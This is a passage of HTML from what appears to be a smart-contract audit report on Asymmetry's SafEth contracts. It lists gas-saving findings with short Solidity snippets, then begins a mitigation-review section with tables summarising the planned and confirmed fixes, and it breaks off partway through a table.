class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">: ((</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">))) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethMinted</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L174\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L174</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L201\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L201</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">: (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L75\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L75</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L60\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L60</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wstEthAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">wstEthBalancePost</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">wstEthBalancePre</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L79\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L79</a></p>\n<h2 id=\"g-12-use-functions-instead-of-modifiers\" style=\"position:relative;\"><a href=\"#g-12-use-functions-instead-of-modifiers\" aria-label=\"g 12 use functions instead of modifiers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] Use functions instead of modifiers</h2>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">: </span><span class=\"mtk12\">ERC20Upgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk11\">__ERC20_init</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenName</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenSymbol</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L52\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L52</a></p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Functions guaranteed to revert when called by normal users can be marked payable.</p>\n<h2 id=\"g-13-use-solidity-version-0819-to-gain-some-gas-boost\" style=\"position:relative;\"><a href=\"#g-13-use-solidity-version-0819-to-gain-some-gas-boost\" aria-label=\"g 13 use solidity version 0819 to gain some gas boost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] Use solidity version 0.8.19 to gain some gas boost</h2>\n<p>Upgrade to the latest solidity version 0.8.19 to get additional gas savings.<br>\nSee latest release for reference: <a href=\"https://blog.soliditylang.org/2023/02/22/solidity-0.8.19-release-announcement/\">https://blog.soliditylang.org/2023/02/22/solidity-0.8.19-release-announcement/</a></p>\n<h3 id=\"proof-of-concept-30\" style=\"position:relative;\"><a href=\"#proof-of-concept-30\" aria-label=\"proof of concept 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L2\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L2\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L2\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L2\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L2</a></p>\n<h2 id=\"g-14-save-loop-calls\" style=\"position:relative;\"><a href=\"#g-14-save-loop-calls\" aria-label=\"g 14 save loop calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-14] Save loop calls</h2>\n<p>Instead of calling <code>derivatives[i]</code> 3 times in each loop for fetching data, it can be saved as a variable.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L71-L75\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L71-L75</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"159\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// withdraw a percentage of each asset based on the amount of safETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">_safEthAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// if derivative empty ignore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L113-L119\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L113-L119</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"160\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L140-L143\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L140-L143</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/235#issuecomment-1502246753\">elmutt (Asymmetry) confirmed</a></strong></p>\n<hr>\n<h1 id=\"mitigation-review\" style=\"position:relative;\"><a href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"#mitigation-review\">Mitigation Review</a></h1>\n<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>Following the C4 audit, 3 wardens (<a href=\"https://twitter.com/IAm0x52\">0x52</a>, <a href=\"https://twitter.com/adrianromero\">adriro</a>, and d3e4) reviewed the mitigations for all identified issues. Additional details can be found within the <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest\">C4 Asymmetry Mitigation Review repository</a>.</p>\n<h2 id=\"overview-of-changes\" style=\"position:relative;\"><a href=\"#overview-of-changes\" aria-label=\"overview of changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview of Changes</h2>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#overview-of-changes\">Summary from the Sponsor</a>:</strong></p>\n<blockquote>\n<p>Most of the mitigations I feel are self explanatory.</p>\n<p>The one exception is H-04, I would like extra attention towards that one because we are assuming 1:1 but are reverting if the CRV pool is depegged.  I think there could be a better solution, but it seems that we had many issues that had separate solutions, one being adding a chainlink oracle, which doesn’t exist.</p>\n</blockquote>\n<h2 id=\"mitigation-review-scope\" style=\"position:relative;\"><a href=\"#mitigation-review-scope\" aria-label=\"mitigation review scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review Scope</h2>\n<table>\n<thead>\n<tr>\n<th>Mitigation of</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>H-01</td>\n<td>Use internal accounting to get the balance</td>\n</tr>\n<tr>\n<td>H-02</td>\n<td>Don’t get rETH from pool on deposits</td>\n</tr>\n<tr>\n<td>H-03</td>\n<td>Enable/Disable Derivatives</td>\n</tr>\n<tr>\n<td>H-04</td>\n<td>To protect against oracle attacks we assume FRX is 1:1 with ETH and revert if the oracle says otherwise since there is no chainlink for FRX</td>\n</tr>\n<tr>\n<td>H-05</td>\n<td>Using Chainlink to get price instead of poolPrice</td>\n</tr>\n<tr>\n<td>H-06</td>\n<td>Using Chainlink to get price instead of assuming 1:1</td>\n</tr>\n<tr>\n<td>H-07</td>\n<td>Check if withdraw from deposit contract possible</td>\n</tr>\n<tr>\n<td>H-08</td>\n<td>Using Chainlink to get price instead of poolPrice</td>\n</tr>\n<tr>\n<td>M-01</td>\n<td>Don’t divide before multiply</td>\n</tr>\n<tr>\n<td>M-02</td>\n<td>Fixing it by enable/disable derivatives</td>\n</tr>\n<tr>\n<td>M-04</td>\n<td>Using swapTo/swapFrom directly from rocketpool</td>\n</tr>\n<tr>\n<td>M-05</td>\n<td>Fixing it by enable/disable derivatives</td>\n</tr>\n<tr>\n<td>M-08</td>\n<td>Use Chainlink to get rETH</td>\n</tr>\n<tr>\n<td>M-10</td>\n<td>Check derivativeCount on stake</td>\n</tr>\n<tr>\n<td>M-11</td>\n<td>Use entire balance for rebalance</td>\n</tr>\n<tr>\n<td>M-12</td>\n<td>Pass in minAmount</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"mitigation-review-summary\" style=\"position:relative;\"><a href=\"#mitigation-review-summary\" aria-label=\"mitigation review summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review Summary</h2>\n<table>\n<thead>\n<tr>\n<th>Original Issue</th>\n<th>Status</th>\n<th>Full Details</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1098\">H-01</a></td>\n<td>Mitigation confirmed with comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/25\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/23\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/3\">0x52</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004\">H-02</a></td>\n<td>Mitigation confirmed with comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/30\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/24\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/4\">0x52</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703\">H-03</a></td>\n<td>Mitigation confirmed with comments</td>\n<td>Reports from d3e4 (<a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/31\">here</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/74\">here</a>), <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/26\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/5\">0x52</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/641\">H-04</a></td>\n<td>Mitigation confirmed with comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/32\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/27\">adriro</a></td>\n</tr>\n<tr>\n<td><a 